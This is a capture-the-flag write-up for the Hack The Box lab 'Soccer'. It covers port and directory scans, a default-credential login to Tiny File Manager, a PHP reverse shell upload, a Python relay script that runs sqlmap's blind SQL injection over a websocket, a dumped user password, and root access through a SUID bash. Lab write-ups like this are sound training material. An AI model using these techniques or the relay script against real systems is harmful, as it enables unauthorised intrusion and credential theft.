# Initial scanning
First I ran an nmap scan to check for open ports and available services on this machine
```
karim@alpacino:~/Desktop/htb$ nmap -sC -sV 10.10.11.194
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-19 20:05 EET
Nmap scan report for 10.10.11.194
Host is up (0.068s latency).
Not shown: 978 closed tcp ports (conn-refused)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp    open     http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
```
so there are three ports open which are 22 for ssh and 9091 for xmltec-xmlmail service which will be usefull in the future and xmltec-xmlmail80 for http and its redircting me to soccer.htb so I added the ip in my **/etc/hosts** file to access the website
![[img/Screenshot from 2023-01-19 20-29-11.png]]

and I was to able to access the website. so I ran a gobsuter scan to find hidden directories  in the website
```
karim@alpacino:~/Desktop/htb$ sudo gobuster dir -u http://soccer.htb -w /opt/wordllists/dirbuster/directory-list-2.3-medium.txt 
[sudo] password for karim: 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordllists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/19 20:33:16 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
```
gobuster found a directory called tiny so I opened a login page appeared to me
![[img/Screenshot from 2023-01-19 20-41-47.png]]
After a little research I found that tiny is a file manger so I viewed the source code to find if there is a version number and I found it and it was "**2.4.3**"
![[Screenshot from 2023-01-19 20-45-28.png]]
so I searched online for the default credentials of this version and I found "**admin:admin@123**" so I tried it and worked and I got logged in as admin user
# Initial Foothold
I was prompted to a file managment system with the  ability to upload file
![[Screenshot from 2023-01-19 21-25-17.png]]
so I tried to upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) but it was only uploaded succefully in the **/var/www/html/tiny/uploads** directory and I obtained a reverse shell
![[img/Screenshot from 2023-01-20 14-38-32.png]]
I tried to cat the user.txt file in the /home/player directory to obtain the flag but I didn't have the permission to read the file
```
www-data@soccer:/home/player$ cat user.txt
cat: user.txt: Permission denied
```
so I searched in the default folder for something odd and I found **/etc/nginx** which inticades that there is an nginx server running so I cded to /etc/nginx/sites-enabled and I found **soc-player.htb** file and I found that there is another server running with another subdomain
```
www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}

}
```
so I added the subdomain to my **/etc/hosts** file and I opened it in my browser
![[Screenshot from 2023-01-20 15-08-20.png]]
And I found that it has a signup functionality and a functionality to book tickets to matches so I created an account and went to the tickets booking page
![[Screenshot from 2023-01-20 15-26-16.png]]
and as you can see I tried sql injection and it appeared that this form is vurnable to blind sql injection so I fired up burp suite to analyze the application and to know what technology it is using.
![[Screenshot from 2023-01-20 15-33-26.png]]
So I discovered that it run websocket and unfortunatly You can't use sqlmap map with websockets directly so searches online and found [this article](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) that explains how to use sqlmap with websockets.
so I used the script in the article and modified it to be compatable with our machine and here is the modified script
```
from http.server import SimpleHTTPRequestHandler  
from socketserver import TCPServer  
from urllib.parse import unquote, urlparse  
from websocket import create_connection  
  
ws_server = "ws://soc-player.soccer.htb:9091"  
  
def send_ws(payload):  
 ws = create_connection(ws_server)  
 # If the server returns a response on connect, use below line   
 #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here  
   
 # For our case, format the payload in JSON  
 message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure  
 data = '{"id":"%s"}' % message  
  
 ws.send(data)  
 resp = ws.recv()  
 ws.close()  
  
 if resp:  
  return resp  
 else:  
  return ''  
  
def middleware_server(host_port,content_type="text/plain"):  
  
 class CustomHandler(SimpleHTTPRequestHandler):  
  def do_GET(self) -> None:  
   self.send_response(200)  
   try:  
    payload = urlparse(self.path).query.split('=',1)[1]  
   except IndexError:  
    payload = False  
      
   if payload:  
    content = send_ws(payload)  
   else:  
    content = 'No parameters specified!'  
  
   self.send_header("Content-type", content_type)  
   self.end_headers()  
   self.wfile.write(content.encode())  
   return  
  
 class _TCPServer(TCPServer):  
  allow_reuse_address = True  
  
 httpd = _TCPServer(host_port, CustomHandler)  
 httpd.serve_forever()  
  
  
print("[+] Starting MiddleWare Server")  
print("[+] Send payloads in http://localhost:8081/?id=*")  
  
try:  
 middleware_server(('0.0.0.0',8081))  
except KeyboardInterrupt:  
 pass
```
and I ran sqlmap and the following credentials appeared
```
+------+-------------------+----------+----------------------+
| id   | email             | username | password             |
+------+-------------------+----------+----------------------+
| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
+------+-------------------+----------+----------------------+
```
so I logged in via ssh to the machine as player user and I was able to read the user flag
# Privilage Escalation
so I uploaded [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) script and ran it on the machine
![[Screenshot from 2023-01-21 18-30-12.png]]
so I ran the /usr/bin/bash script with the following command
```
bash-5.0$ /usr/bin/bash -p
```
so that's how I was able to be the root user
![[Screenshot from 2023-01-21 18-32-15.png]]
# conclusion
In the end of this writeup I would like to share my thoughts about this machine.
I think this machine is a good one and if you solve it you will learn multipe things like automating websocket sql injection and I think that the creator of this machine should be respected.